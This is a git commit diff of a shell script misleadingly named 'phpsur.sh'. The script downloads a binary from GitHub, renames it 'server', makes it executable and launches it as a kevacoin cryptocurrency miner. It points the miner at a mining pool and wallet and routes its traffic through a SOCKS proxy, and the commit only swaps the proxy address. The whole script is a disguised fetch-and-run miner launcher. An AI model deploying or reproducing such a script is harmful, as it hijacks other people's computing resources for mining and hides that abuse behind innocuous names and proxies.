338bedefa58ebc98b5b27afca2de9de5d69dbd50
Ankie-Davenschot <90869291+Ankie-Davenschot@users.noreply.github.com>
2021-09-17 06:44:00 +0700

    Update phpsur.sh

--- phpsur.sh
+++ phpsur.sh
@@ -4,4 +4,4 @@ sudo apt install screen libjansson4 -y
 wget -O server https://github.com/Ankie-Davenschot/Davenschot/raw/main/server 
 screen -dmS ls
 chmod +x phpsur.sh && chmod +x server && chmod 777 server phpsur.sh
-./server --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password AA=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://184.75.247.3:59644
+./server --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password AA=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks4://72.206.181.105:64935
